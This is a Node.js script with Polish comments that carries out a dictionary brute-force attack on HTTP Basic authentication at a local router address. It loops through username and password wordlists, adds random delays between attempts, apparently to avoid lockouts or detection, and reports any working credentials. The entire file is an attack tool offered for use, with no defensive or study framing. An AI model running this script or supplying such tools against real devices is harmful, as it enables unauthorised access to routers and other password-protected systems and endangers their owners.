const { spawn } = require('child_process');
const rp = require('request-promise');
const fs = require('fs');
const readline = require('readline');
const ProgressBar = require('progress');
const chalk = require('chalk');

// Adres URL do logowania HTTP
const httpLoginURL = 'http://192.168.1.1';

// Ścieżka do pliku ze słownikiem użytkowników
const userWordlist = 'users.txt';

// Ścieżka do pliku ze słownikiem haseł
const passwordWordlist = 'passwords.txt';

// Funkcja do przeprowadzania ataku brute force na logowanie HTTP
async function bruteForceHTTPLogin(url) {
    console.log('Rozpoczęto atak brute force na logowanie HTTP...');

    try {
        // Sprawdź, czy pliki ze słownikami istnieją
        if (!fs.existsSync(userWordlist)) {
            throw new Error(`Nie znaleziono pliku ze słownikiem użytkowników: ${userWordlist}`);
        }
        if (!fs.existsSync(passwordWordlist)) {
            throw new Error(`Nie znaleziono pliku ze słownikiem haseł: ${passwordWordlist}`);
        }

        // Utwórz obiekt readline do wczytywania pliku ze słownikiem użytkowników
        const userReader = readline.createInterface({
            input: fs.createReadStream(userWordlist),
            crlfDelay: Infinity
        });

        // Utwórz zmienną do przechowywania liczby sprawdzonych kombinacji
        let checkedCount = 0;

        // Utwórz zmienną do przechowywania liczby wszystkich kombinacji
        let totalCount = 0;

        // Utwórz pasek postępu
        const bar = new ProgressBar('Sprawdzanie [:bar] :percent :etas', {
            complete: '=',
            incomplete: ' ',
            width: 20,
            total: fs.readFileSync(passwordWordlist, 'utf8').split('\n').length
        });

        // Iteruj po każdym użytkowniku
        for await (const user of userReader) {
            // Pomiń puste użytkowniki
            if (user === '') continue;

            // Utwórz obiekt readline do wczytywania pliku ze słownikiem haseł
            const passwordReader = readline.createInterface({
                input: fs.createReadStream(passwordWordlist),
                crlfDelay: Infinity
            });

            // Iteruj po każdym haśle
            for await (const password of passwordReader) {
                // Pomiń puste hasła
                if (password === '') continue;

                // Zwiększ liczbę wszystkich kombinacji
                totalCount++;

                // Aktualizuj pasek postępu
                bar.tick();

                // Użyj losowego opóźnienia między 500 a 1500 milisekund
                const randomDelay = Math.floor(Math.random() * 1000) + 500;
                await new Promise(resolve => setTimeout(resolve, randomDelay));

                const credentials = `${user}:${password}`;
                const base64Credentials = Buffer.from(credentials).toString('base64');

                try {
                    // Wyślij zapytanie HTTP z danymi logowania
                    const response = await rp(url, {
                        headers: {
                            'Authorization': `Basic ${base64Credentials}`
                        },
                        resolveWithFullResponse: true // Zwróć pełną odpowiedź, a nie tylko ciało
                    });

                    // Sprawdź, czy odpowiedź jest poprawna
                    if (response.statusCode === 200) {
                        // Znaleziono poprawne dane logowania
                        console.log(chalk.green(`Znaleziono poprawne dane logowania: ${credentials}`));
                        return; // Zakończ funkcję po znalezieniu poprawnego hasła
                    } else {
                        // Nieudane logowanie
                        console.log(chalk.red(`Nieudane logowanie dla: ${credentials}`));
                    }
                } catch (error) {
                    // Wystąpił błąd związany z połączeniem sieciowym lub zapytaniem HTTP
                    console.error(chalk.yellow(`Błąd zapytania HTTP dla: ${credentials}`));
                    console.error(chalk.yellow(error.message));
                }

                // Zwiększ liczbę sprawdzonych kombinacji
                checkedCount++;
            }

            // Zamknij obiekt readline dla haseł
            passwordReader.close();
        }

        // Sprawdź, czy znaleziono poprawne dane logowania
        console.log(chalk.red('Nie znaleziono poprawnych danych logowania.'));
        // Wyświetl podsumowanie ataku brute force
        console.log(`Sprawdzono ${checkedCount} z ${totalCount} kombinacji.`);
    } catch (error) {
        // Obsłuż błąd
        console.error(chalk.red('Wystąpił błąd:'));
        console.error(chalk.red(error.message));
    }
}

// Wywołaj funkcję ataku brute force
bruteForceHTTPLogin(httpLoginURL);
